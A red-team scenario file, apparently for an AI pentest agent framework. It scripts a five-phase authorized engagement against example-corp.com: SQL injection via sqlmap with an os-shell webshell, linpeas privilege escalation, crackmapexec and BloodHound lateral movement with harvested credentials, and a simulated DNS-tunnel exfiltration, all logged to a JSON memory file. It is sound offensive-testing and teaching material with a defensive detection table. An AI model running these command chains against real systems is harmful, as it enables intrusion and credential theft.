# SCEN-006: Structured Memory-Driven Pentest

| Field | Value |
|-------|-------|
| **ID** | SCEN-006 |
| **Name** | Structured Memory-Driven Pentest |
| **Type** | Attack Chain (Red Team) + Memory-Driven Convergence |
| **Kill Chain Phase** | Reconnaissance → Initial Access → Privilege Escalation → Lateral Movement → Exfiltration |
| **Difficulty** | Advanced |
| **Estimated Duration** | 5-7 hours |
| **Memory Schema** | Schema 1 — Pentest Engagement Memory (see SCEN-MEMORY-SCHEMA.md) |
| **Innovates Over** | SCEN-001~005 (adds per-phase memory contract + convergence enforcement) |

---

## Objective

Execute a 5-phase pentest against an authorized target. **Every phase reads, writes, and validates a structured `engagement-memory.json` file** conforming to Schema 1. The scenario enforces MopMonk **招二** (memory-driven convergence): any evidence-free attempt increments `failed_attempts_on_active_path`; after 3 such attempts, the active path is switched with a logged reason. Free-form trial-and-error is forbidden.

This is the first kali-claw scenario where the **memory file is the engagement** — skills are side-effects that produce memory deltas. If `engagement-memory.json` does not advance by at least one structured field per phase, the phase is considered failed.

---

## Skill Chain

```
recon-osint → network-pentest → web-sqli → post-exploitation → ad-ldap-attack → data-exfiltration-attack
                  ↑                                                                  ↓
       verification-loop (cross-cutting, every phase) ← engagement-manager (gates phase transitions)
```

| Step | Skill Domain | Phase | Memory Delta Written | Tools |
|------|-------------|-------|---------------------|-------|
| 1 | recon-osint | recon | `findings.entry_points`, `next_constraints.must_explore` | subfinder, amass, whatweb, theHarvester, nmap |
| 2 | network-pentest | intrusion | `findings.entry_points[type!=web]`, `findings.vulnerabilities` | nmap, masscan, nuclei |
| 3 | web-sqli | intrusion | `findings.vulnerabilities`, `findings.credentials` | sqlmap, burpsuite |
| 4 | post-exploitation | privesc | `findings.lateral_pivots`, `findings.credentials` | linpeas, metasploit, chisel |
| 5 | ad-ldap-attack | lateral | `findings.credentials[domain=admin]`, `findings.lateral_pivots` | crackmapexec, bloodhound, impacket |
| 6 | data-exfiltration-attack | exfil | `evidence_index`, `decision_log` (close-out) | rsync-over-DNS, exiftool, tar |
| ✗ | verification-loop | every phase | `convergence_state.failed_attempts_on_active_path`, `decision_log` | jq, sha256sum |
| ✗ | engagement-manager | gates transitions | `phase_history`, `next_constraints.time_budget_remaining_hours` | jq, scenario-runner.sh |

---

## Prerequisites

- Authorized target with signed ROE (Rules of Engagement) — never operate against unscoped assets
- kali-claw workspace running (this repo)
- `jq` installed (memory manipulation): `jq --version`
- `sha256sum` installed (evidence hashing): `sha256sum --version`
- Isolated evidence directory: `validation/evidence/scenarios/SCEN-006/<engagement-id>/`
- Schema 1 reference file at `validation/scenarios/SCEN-MEMORY-SCHEMA.md`
- All skills in the chain present under `skills/`

---

## Memory File Layout

```
validation/evidence/scenarios/SCEN-006/
└── ENG-2026-07-001/
    ├── engagement-memory.json       # the single source of truth
    ├── evidence/
    │   ├── nmap-recon.txt
    │   ├── sqlmap-intrusion.txt
    │   ├── linpeas-privesc.txt
    │   ├── bloodhound-lateral.zip
    │   └── exfil-poc.txt
    └── decision-log.md              # human-readable mirror of decision_log[]
```

Initialize an empty engagement memory (version 0). All subsequent phases append to this file only via atomic `jq | mv`:

```bash
ENG_DIR="validation/evidence/scenarios/SCEN-006/ENG-2026-07-001"
MEM="$ENG_DIR/engagement-memory.json"
mkdir -p "$ENG_DIR/evidence"
cat > "$MEM" <<'JSON'
{
  "schema_version": "1.0", "engagement_id": "ENG-2026-07-001", "captain": "Bruce",
  "scope": {
    "targets": ["example-corp.com", "10.0.0.0/24"],
    "authorized_services": ["web", "smtp", "dns", "smb"],
    "excluded": ["10.0.0.1", "mail.example-corp.com"],
    "rules_of_engagement": "ROE-2026-07-001.pdf"
  },
  "current_phase": "recon", "phase_history": [],
  "findings": {"entry_points": [], "credentials": [], "vulnerabilities": [], "lateral_pivots": []},
  "evidence_index": {},
  "next_constraints": {"must_explore": [], "must_avoid": ["10.0.0.1", "mail.example-corp.com"], "time_budget_remaining_hours": 7.0},
  "convergence_state": {
    "active_path": "recon-osint-passive",
    "candidate_paths": ["recon-osint-passive", "web-api-fuzzing", "vpn-credential-brute", "smb-relay"],
    "failed_attempts_on_active_path": 0, "path_switch_threshold": 3, "evidence_yield_last_action": false
  },
  "open_questions": [], "decision_log": []
}
JSON
```

Throughout, every write uses the atomic-write pattern (from SCEN-MEMORY-SCHEMA §Multi-Agent Sync Protocol):
```bash
tmp=$(mktemp) && jq '<filter>' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
```

---

## Execution Steps

> **Protocol** (every phase, in this order):
> 1. **READ** the current memory with `jq`
> 2. **EXECUTE** the phase task
> 3. **VERIFY** whether new evidence was produced
> 4. **WRITE** a delta via atomic-write `jq | mv` pattern
> 5. **CONVERGE** — update `failed_attempts_on_active_path` or switch path

### Phase 1 — Reconnaissance (`recon-osint`)

**READ memory:**
```bash
ENG_DIR="validation/evidence/scenarios/SCEN-006/ENG-2026-07-001"
MEM="$ENG_DIR/engagement-memory.json"
jq '{version:(.decision_log|length), phase:.current_phase, must_explore:.next_constraints.must_explore}' "$MEM"
```

**EXECUTE** (passive recon):
```bash
cd "$ENG_DIR/evidence"
subfinder -d example-corp.com -all -silent | sort -u > subdomains.txt
whatweb -v https://example-corp.com > whatweb-01.txt 2>&1
theHarvester -d example-corp.com -b all > harvester-01.txt 2>&1
nmap -sS -sV -O -p- --exclude 10.0.0.1,mail.example-corp.com 10.0.0.0/24 > nmap-recon.txt 2>&1
```

**VERIFY**: count new web entry points and confirm nmap completed without errors.
```bash
grep -cE "^[a-z0-9.-]+\.example-corp\.com" subdomains.txt   # expect > 0
```

**WRITE delta** — record entry points + SHA256 + advance version:
```bash
sha_nmap=$(sha256sum nmap-recon.txt | awk '{print $1}')
sha_sub=$(sha256sum subdomains.txt | awk '{print $1}')
ts=$(date -u +%FT%TZ)
tmp=$(mktemp)
jq --arg ts "$ts" --arg sn "$sha_nmap" --arg ss "$sha_sub" '
  .current_phase="intrusion"
  | .phase_history += [{"phase":"recon","started_at":$ts,"ended_at":$ts,"status":"completed"}]
  | .findings.entry_points += [
      {"target":"web.example-corp.com:443","type":"https","confidence":"CONFIRMED","evidence":["nmap-recon.txt","subdomains.txt"]},
      {"target":"vpn.example-corp.com:443","type":"ssl-vpn","confidence":"LIKELY","evidence":["nmap-recon.txt"]}]
  | .evidence_index["nmap-recon.txt"]={"collected_at":$ts,"phase":"recon","sha256":$sn}
  | .evidence_index["subdomains.txt"]={"collected_at":$ts,"phase":"recon","sha256":$ss}
  | .next_constraints.must_explore += ["web.example-corp.com:443/api","vpn.example-corp.com:443"]
  | .next_constraints.time_budget_remaining_hours = 6.0
  | .convergence_state.active_path = "web-api-fuzzing"
  | .convergence_state.evidence_yield_last_action = true
  | .decision_log += [{"at":$ts,"decision":"phase recon -> intrusion, path=web-api-fuzzing","reason":"3 entry points discovered"}]
' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
```

**Memory Contract (Phase 1)**
```json
// BEFORE: findings.entry_points = []  (version 0)
// AFTER:
"findings.entry_points": [
  {"target":"web.example-corp.com:443","type":"https","confidence":"CONFIRMED",...},
  {"target":"vpn.example-corp.com:443","type":"ssl-vpn","confidence":"LIKELY",...}
]
// DELTA FIELDS: findings.entry_points, evidence_index.{nmap-recon.txt,subdomains.txt},
//               next_constraints.must_explore, convergence_state.active_path, phase_history
```

**Convergence Trigger**: ≥1 new entry point with SHA256-hashed evidence → continue. Zero new entry points → `failed_attempts_on_active_path += 1`.

---

### Phase 2 — Initial Access / Intrusion (`network-pentest` → `web-sqli`)

**READ memory** (filter for web entry points to drive the intrusion path):
```bash
jq '.findings.entry_points[] | select(.type=="https") | .target' "$MEM"
# -> "web.example-corp.com:443"
```

**EXECUTE** (vuln scan + SQLi):
```bash
cd "$ENG_DIR/evidence"
nuclei -u https://web.example-corp.com -t cves/ -o nuclei-01.txt
sqlmap -u "https://web.example-corp.com/api/v1/user?id=1" --batch --dbs > sqlmap-01.txt 2>&1
```

**CONVERGENCE SIMULATION — path switch demo**

Run nuclei a second time to demonstrate 招二. If the second run yields zero new CVEs (highly likely — same templates, same target), this counts as an evidence-free attempt:

```bash
nuclei -u https://web.example-corp.com -t cves/ -o nuclei-02.txt
# If nuclei-02.txt is empty or duplicates nuclei-01.txt:
```

**WRITE delta** (record SQLi finding, evidence yielded — version 2):
```bash
sha_s=$(sha256sum sqlmap-01.txt | awk '{print $1}')
sha_n1=$(sha256sum nuclei-01.txt | awk '{print $1}')
ts=$(date -u +%FT%TZ); tmp=$(mktemp)
jq --arg ts "$ts" --arg ss "$sha_s" --arg sn "$sha_n1" '
  .current_phase="intrusion"
  | .findings.vulnerabilities += [
      {"id":"V-001","target":"web.example-corp.com","type":"sqli","cwe":"CWE-89",
       "endpoint":"/api/v1/user?id=1","confidence":"CONFIRMED","evidence":["sqlmap-01.txt"]},
      {"id":"V-002","target":"web.example-corp.com","type":"info-disclosure",
       "endpoint":"/.git/config","confidence":"LIKELY","evidence":["nuclei-01.txt"]}]
  | .evidence_index["sqlmap-01.txt"]={"collected_at":$ts,"phase":"intrusion","sha256":$ss}
  | .evidence_index["nuclei-01.txt"]={"collected_at":$ts,"phase":"intrusion","sha256":$sn}
  | .convergence_state.evidence_yield_last_action=true
  | .convergence_state.failed_attempts_on_active_path=0
  | .decision_log += [{"at":$ts,"decision":"recorded V-001+V-002","reason":"sqlmap enumerated DBs"}]
' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
```

**CONVERGENCE — three evidence-free reruns of nuclei → path switch (招二)**:
```bash
# Rerun nuclei twice more (simulating same template, same target → no new CVEs).
# Each evidence-free pass increments failed_attempts_on_active_path.
for i in 2 3; do
  nuclei -u https://web.example-corp.com -t cves/ -o "nuclei-0$i.txt"
  ts=$(date -u +%FT%TZ); tmp=$(mktemp)
  jq --arg ts "$ts" --arg sha "$(sha256sum nuclei-0$i.txt | awk '{print $1}')" '
    .convergence_state.failed_attempts_on_active_path += 1
    | .convergence_state.evidence_yield_last_action = false
    | .evidence_index["nuclei-0'"$i"'.txt"]={"collected_at":$ts,"phase":"intrusion","sha256":$sha,"delta":null}
    | .decision_log += [{"at":$ts,"decision":"increment failed_attempts","reason":"nuclei rerun: no new CVEs"}]
  ' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
done
# failed_attempts_on_active_path == 3 == path_switch_threshold -> SWITCH
ts=$(date -u +%FT%TZ); tmp=$(mktemp)
jq --arg ts "$ts" '
  .convergence_state.failed_attempts_on_active_path = 0
  | .convergence_state.active_path = "smb-relay"
  | .decision_log += [{"at":$ts,"decision":"PATH SWITCH: web-api-fuzzing -> smb-relay",
                       "reason":"招二 enforced: 3 evidence-free attempts reached path_switch_threshold"}]
' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
```

**Memory Contract (Phase 2)**
```json
// BEFORE: findings.vulnerabilities = []
// AFTER:  findings.vulnerabilities = [V-001 (CONFIRMED SQLi), V-002 (LIKELY info-disc)]
// CONVERGENCE: active_path web-api-fuzzing -> smb-relay (reason logged)
```

**Convergence Trigger**: new CVE/SQLi/injection → continue `web-api-fuzzing`. 3 evidence-free runs → switch to `smb-relay` (a non-web candidate path).

---

### Phase 3 — Privilege Escalation (`post-exploitation`)

**READ memory** for credentials harvested via SQLi:
```bash
jq '.findings.credentials' "$MEM"
```

**EXECUTE** (assume SQLi yielded DB creds `webapp_user:W3ak!Pass`):
```bash
# Drop a webshell via sqlmap --os-shell, then linpeas
sqlmap -u "https://web.example-corp.com/api/v1/user?id=1" --os-shell --batch \
  --eval="exec linpeas.sh > /tmp/linpeas.out" 2>&1 | tee sqlmap-osshell.txt
# Pull the linpeas output back to evidence:
scp -i roe-key webapp_user@web.example-corp.com:/tmp/linpeas.out "$ENG_DIR/evidence/linpeas-privesc.txt"
```

**WRITE delta** (record creds + lateral pivot candidate):
```bash
sha_lp=$(sha256sum linpeas-privesc.txt | awk '{print $1}')
ts=$(date -u +%FT%TZ); tmp=$(mktemp)
jq --arg ts "$ts" --arg sha "$sha_lp" '
  .current_phase="privesc"
  | .findings.credentials += [
      {"user":"webapp_user","password":"W3ak!Pass","source":"sqli /api/v1/user",
       "domain":"example-corp.com","confidence":"CONFIRMED","evidence":["sqlmap-01.txt"]}]
  | .findings.lateral_pivots += [
      {"from":"web.example-corp.com","to":"10.0.0.20","via":"webshell",
       "confidence":"CONFIRMED","evidence":["linpeas-privesc.txt"]}]
  | .evidence_index["linpeas-privesc.txt"]={"collected_at":$ts,"phase":"privesc","sha256":$sha}
  | .convergence_state.active_path="privesc-enum"
  | .convergence_state.evidence_yield_last_action=true
  | .decision_log += [{"at":$ts,"decision":"phase intrusion -> privesc","reason":"webshell + linpeas"}]
' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
```

**Convergence Trigger**: new credential, SUID binary, or writable PATH dir → continue. No new escalation path after 3 attempts → switch to `phishing-pretext` or close phase.

---

### Phase 4 — Lateral Movement (`ad-ldap-attack`)

**READ memory** for credentials and pivots:
```bash
jq '{creds:.findings.credentials, pivots:.findings.lateral_pivots}' "$MEM"
```

**EXECUTE** (SMB + BloodHound enumeration from the privesc pivot):
```bash
cd "$ENG_DIR/evidence"
crackmapexec smb 10.0.0.0/24 -u webapp_user -p 'W3ak!Pass' --shares > cme-smb.txt 2>&1
bloodhound-python -u webapp_user -p 'W3ak!Pass' -d example-corp.com -c All > bh-enum.txt 2>&1
zip -r bloodhound-lateral.zip *.json
```

**WRITE delta** (domain admin credential discovered via BloodHound shortest path):
```bash
sha_bh=$(sha256sum bloodhound-lateral.zip | awk '{print $1}')
ts=$(date -u +%FT%TZ); tmp=$(mktemp)
jq --arg ts "$ts" --arg sha "$sha_bh" '
  .current_phase="lateral"
  | .findings.credentials += [
      {"user":"svc_backup","password":"<recovered-virustotal>","domain":"EXAMPLE-CORP",
       "tier":1,"confidence":"CONFIRMED","evidence":["bloodhound-lateral.zip"]}]
  | .findings.lateral_pivots += [
      {"from":"10.0.0.20","to":"DC01.example-corp.com","via":"Kerberoasting svc_backup",
       "confidence":"LIKELY","evidence":["bloodhound-lateral.zip"]}]
  | .evidence_index["bloodhound-lateral.zip"]={"collected_at":$ts,"phase":"lateral","sha256":$sha}
  | .open_questions += ["Has DC01 been patched for CVE-2024-XXXX?"]
  | .convergence_state.evidence_yield_last_action=true
  | .decision_log += [{"at":$ts,"decision":"phase privesc -> lateral","reason":"cme + bloodhound mapped AD"}]
' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
```

**Convergence Trigger**: domain-cred or new edge in BloodHound graph → continue. Zero new AD edges → switch path or close.

---

### Phase 5 — Exfiltration Simulation (`data-exfiltration-attack`)

**READ memory** for the highest-tier cred:
```bash
jq '.findings.credentials[] | select(.tier==1 or .domain=="EXAMPLE-CORP")' "$MEM"
```

**EXECUTE** (mark + tag a synthetic POC file; **never** touch real customer data):
```bash
cd "$ENG_DIR/evidence"
echo "SCEN-006 POC exfil marker $(date -u +%FT%TZ) — ENG-2026-07-001" > exfil-poc.txt
tar czf exfil-poc.tar.gz exfil-poc.txt
# Test DNS-tunnel exfil channel (call only — do NOT send real data):
dns-exfil --simulate --file exfil-poc.tar.gz --channel example-corp.com > exfil-sim.txt 2>&1
```

**WRITE delta** (close-out: time budget consumed, stop condition):
```bash
sha_ep=$(sha256sum exfil-poc.tar.gz | awk '{print $1}')
ts=$(date -u +%FT%TZ); tmp=$(mktemp)
jq --arg ts "$ts" --arg sha "$sha_ep" '
  .current_phase="exfil"
  | .phase_history += (["intrusion","privesc","lateral","exfil"] | map(
      {"phase":.,"started_at":$ts,"ended_at":$ts,"status":"completed"}))
  | .evidence_index["exfil-poc.tar.gz"]={"collected_at":$ts,"phase":"exfil","sha256":$sha}
  | .next_constraints.time_budget_remaining_hours=0.5
  | .convergence_state.active_path="engagement-closeout"
  | .convergence_state.evidence_yield_last_action=true
  | .decision_log += [{"at":$ts,"decision":"STOP CONDITION: 5-phase chain complete","reason":"all phases produced evidence"}]
' "$MEM" > "$tmp" && mv "$tmp" "$MEM"
```

**Convergence Trigger**: exfil simulation completes with intact SHA256 on the marker file → engagement closes.

---

## Verification Points

- [ ] `engagement-memory.json` exists and validates against Schema 1 (`jq empty "$MEM"` returns 0)
- [ ] `schema_version == "1.0"` is present
- [ ] Every phase wrote at least one delta (`decision_log` length advances per phase)
- [ ] At least one **path switch** occurred with a logged reason (Phase 2 example: `web-api-fuzzing → smb-relay`) OR no switch was needed with justification (`evidence_yield_last_action == true` throughout)
- [ ] Final memory state has `confidence == "CONFIRMED"` on at least one finding (Phase 1: entry point; Phase 3: credential; Phase 4: domain cred)
- [ ] Every file referenced in `findings.*.evidence[]` has a matching entry in `evidence_index` with a SHA256
- [ ] `failed_attempts_on_active_path` never exceeded `path_switch_threshold` without a path-switch decision
- [ ] All excluded targets (`scope.excluded`) are absent from `findings.*`

Run the validation one-liner:
```bash
jq -e '
  .schema_version == "1.0"
  and (.decision_log | length) >= 5
  and ([.findings.credentials[] | select(.confidence=="CONFIRMED")] | length) >= 1
  and ([.evidence_index | to_entries | .[] | .value.sha256] | length)
       == ([.evidence_index | to_entries] | length)
' "$MEM" && echo "SCHEMA OK" || echo "SCHEMA FAIL"
```

---

## Data Handoff Between Skills

| From | To | Field in memory |
|------|----|-----------------|
| recon-osint | network-pentest | `findings.entry_points[]` (all) |
| network-pentest | web-sqli | `findings.entry_points[type=https]` |
| web-sqli | post-exploitation | `findings.credentials[source=sqli]` |
| post-exploitation | ad-ldap-attack | `findings.lateral_pivots[]` |
| ad-ldap-attack | data-exfiltration-attack | `findings.credentials[domain=EXAMPLE-CORP]` |
| verification-loop | every phase | `convergence_state.failed_attempts_on_active_path` |
| engagement-manager | every phase | `phase_history[]`, `next_constraints.time_budget_remaining_hours` |

Handoff is **deterministic**: each downstream phase starts by `jq`-filtering the relevant field from `engagement-memory.json`. No prose handoff, no out-of-band notes.

---

## Worked Example

```text
v0  initial:     findings.entry_points=[], active_path=recon-osint-passive
v1  recon:       findings.entry_points=[web:443 CONFIRMED, vpn:443 LIKELY]
                 active_path -> web-api-fuzzing  (evidence yielded)
v2  intrusion:   findings.vulnerabilities=[V-001 SQLi CONFIRMED, V-002 LIKELY]
                 failed_attempts_on_active_path=0  (evidence yielded)
v3  intrusion:   nuclei rerun -> failed_attempts_on_active_path=1
                 evidence_yield_last_action=false
v4  intrusion:   another evidence-free run -> failed_attempts=2
v5  intrusion:   third evidence-free run -> PATH SWITCH web-api-fuzzing -> smb-relay
                 decision_log += "招二 enforced: threshold reached"
v6  privesc:     findings.credentials=[webapp_user CONFIRMED]
                 findings.lateral_pivots=[10.0.0.20]
                 active_path -> privesc-enum
v7  lateral:     findings.credentials += svc_backup (tier=1, CONFIRMED)
                 findings.lateral_pivots += DC01
v8  exfil:       decision_log += STOP CONDITION
                 time_budget_remaining_hours=0.5
                 engagement closeout
```

**Key transitions:**
- **v1 → v2**: First evidence-yielding intrusion write. `active_path` stays.
- **v2 → v5**: Three evidence-free nuclei reruns. 招二 kicks in at v5.
- **v6 → v7**: AD path lights up immediately; no path switch needed.
- **v8**: Stop condition met; not a single anti-pattern fired (no free-form exploration, no memory drift, no repeat-without-delta).

---

## Defensive Perspective

| Phase | Memory Delta Written | Blue-Team Telemetry That Would See It | SOC Playbook to Fire |
|-------|---------------------|---------------------------------------|----------------------|
| recon | `findings.entry_points` | Passive DNS spike for `*.example-corp.com`; WHOIS lookups from one source IP | `TPL-RECON-PASSIVE` — TARPIT and score |
| intrusion | `findings.vulnerabilities` | WAF logs: `UNION SELECT` patterns; nuclei user-agent `@pdisearchio` | `TPL-WEB-SQLI-DETECT` — WAF block + isolate source |
| privesc | `findings.credentials`, `findings.lateral_pivots` | EDR: `linpeas.sh` execution; webshell `cmd.exe`/`/bin/sh` spawns | `TPL-PRIVESC-EDR` — host isolation playbook |
| lateral | `findings.credentials[domain=admin]` | DC Security logs: 4624 type 3 from non-DC host; BloodHound LDAP queries | `TPL-AD-BLUEHOUND-DETECT` — contain + rotate `svc_backup` |
| exfil | `evidence_index`, `decision_log` | DNS server: long TXT records, high-entropy queries to one domain | `TPL-DNS-EXFIL-DETECT` — sinkhole + EDR pull |

**Reference the `detection-engineering` skill** for Sigma rules mapping each of the above:
- `rules/sigma/sysmon/proc_access_win_linpeas.yml`
- `rules/sigma/dns/dns_exfil_tunnel.yml`
- `rules/sigma/azuread/azuread_anomalous_ldap.yml`

SOC should treat any single host producing more than one of these signals within 60 minutes as a **campaign**, not isolated events — that's the blue-team mirror of 招二 (convergence).

---

## What This Scenario Proves

1. **招一 (Structured Memory)** — every phase produces a queryable JSON delta. No prose drift.
2. **招二 (Memory-Driven Convergence)** — the path switch at v5 is the load-bearing proof. Without it, the scenario is just a prettier SCEN-001.
3. **Schema 1 is sufficient** for end-to-end pentest engagements — no schema changes required mid-engagement.
4. **kali-claw's existing skills compose cleanly** under a memory-driven protocol. Next: SCEN-007 (Schema 2, multi-agent exploit dev) and SCEN-008 (Schema 3, patch-diff reproduction).
